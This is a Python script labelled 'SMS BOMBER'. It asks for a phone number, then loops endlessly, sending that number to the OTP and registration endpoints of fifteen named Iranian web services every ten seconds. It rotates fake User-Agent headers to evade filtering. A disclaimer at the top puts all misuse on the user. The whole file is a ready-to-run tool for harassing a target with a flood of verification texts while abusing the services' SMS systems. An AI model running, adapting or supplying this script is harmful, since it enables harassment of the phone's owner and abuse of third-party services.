# AmirReza Delir 

# هر گونه سوءاستفاده از این نرم افزار به عهده شما کاربر است  من در این مورد  مسئولیتی نداریم

# Any misuse of this software is up to you, the user, I am not responsible in this regard

from re import M
from tkinter import N
from turtle import color
import requests
import random
import time
from rich.console import Console
from rich.progress import track
from time import sleep
from Cython.Build import cythonize
print('''

                         _      _____               _____       __      
         /\             (_)    |  __ \             |  __ \     | (_)     
        /  \   _ __ ___  _ _ __| |__) |___ ______ _| |  | | ___| |_ _ __ 
       / /\ \ | '_ ` _ \| | '__|  _  // _ \_  / _` | |  | |/ _ \ | | '__|
      / ____ \| | | | | | | |  | | \ \  __// / (_| | |__| |  __/ | | |   
     /_/    \_\_| |_| |_|_|_|  |_|  \_\___/___\__,_|_____/ \___|_|_|_|   
                                                                                                                                                                                                          
''')
print('''
        |=================================|
        | Programmer: Amirreza Delir      |
        | Email: deliramirreza@gmail.com  |
        | Instagram: AmirReza_Delir       |
        |=================================|
''')
console = Console()
console.rule("[bold Blue]App Version 20.22")
def process_data():
    sleep(0.03)
for _ in track(range(100), description='[green]Loading'):
    process_data()
console.rule("[bold Purple]English")
print("Any misuse of this software is up to you,\nthe user, I am not responsible in this regard.")
console.rule("[bold Purple]Persian")
print("hr gvnh sv astfadh az ain nrmafzar bh ehdh shoma karbr ast\n man dr ain mvrd msvliti ndarim.")
console.rule("[bold red]SMS BOMBER")
def process_data():
    sleep(0.05)
for _ in track(range(100), description='[green]Loading'):
    process_data()
number = input("Enter your phone number->> ")
url_divar = "https://api.divar.ir/v5/auth/authenticate"
json_divar ={"phone": number}

url_snapp = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
json_snapp = {"cellphone": number}

url_gap = "https://api.mobit.ir/api/web/v8/register/register"
json_gap = {"number": number}

url_sh = "https://www.sheypoor.com/api/v10.0.0/auth/send"
json_sh = {"username": number}

url_timch = "https://api.timcheh.com/auth/otp/send"
json_timch ={"mobile": number}

url_fafait = "https://api2.fafait.net/oauth/check-user"
json_fafait ={"id": number}

url_lioncomputer = "https://www.lioncomputer.com/api/v1/auth/send-register-code"
json_lioncomputer ={"mobile": number}

url_alibaba = "https://ws.alibaba.ir/api/v3/account/mobile/otp"
json_alibaba ={"phoneNumber": number}

url_trip = "https://gateway.trip.ir/api/Totp"
json_trip ={"PhoneNumber": number}

url_eligasht = "https://www.eligasht.com/Authentication/register"
json_eligasht ={"username": number}

url_payaneh = "https://m.payaneh.ir/api/code/send"
json_payaneh ={"phone": number}

url_delino = "https://www.delino.com/user/register"
json_delino ={"mobile": number}

url_mamifood = "https://mamifood.org/Registration.aspx/SendValidationCode"
json_mamifood ={"Phone":number}

url_zoodex = "https://admin.zoodex.ir/api/v1/login/check"
json_zoodex ={"mobile":number}

url_snappfood = "https://api.snappfood.biz/v1/otp"
json_snappfood ={"Phone":number}

heads = [
    {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0',
    'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
    {
    'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0',
    'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0",
    'Accept': '*/*'
    },
    {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0',
    'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
    {
    'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0',
    'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0",
    'Accept': '*/*'
    },
    ]

while True:
    random_head = random.choice(heads)

    req0 = requests.post(url=url_divar,json=json_divar,headers=random_head)
    print(req0)
    
    req1 = requests.post(url=url_snapp,json=json_snapp,headers=random_head)
    print(req1)

    req2 = requests.post(url_gap, json=json_gap,headers=random_head)
    print(req2)

    req3 = requests.post(url=url_sh,json=json_sh,headers=random_head)
    print(req3)

    req4 = requests.post(url=url_timch,json=json_timch,headers=random_head)
    print(req4)

    req5 = requests.post(url=url_fafait,json=json_fafait,headers=random_head)
    print(req5)

    req6 = requests.post(url=url_lioncomputer,json=json_lioncomputer,headers=random_head)
    print(req6)

    req7 = requests.post(url=url_alibaba,json=json_alibaba,headers=random_head)
    print(req7)

    req8 = requests.post(url=url_trip,json=json_trip,headers=random_head)
    print(req8)

    req9 = requests.post(url=url_eligasht,json=json_eligasht,headers=random_head)
    print(req9)

    req10 = requests.post(url=url_payaneh,json=json_payaneh,headers=random_head)
    print(req10)

    req11 = requests.post(url=url_delino,json=json_delino,headers=random_head)
    print(req11)

    req12 = requests.post(url=url_mamifood,json=json_mamifood,headers=random_head)
    print(req12)

    req13 = requests.post(url=url_zoodex,json=json_zoodex,headers=random_head)
    print(req13)

    req14 = requests.post(url=url_snappfood,json=json_snappfood,headers=random_head)
    print(req14)

    time.sleep(10)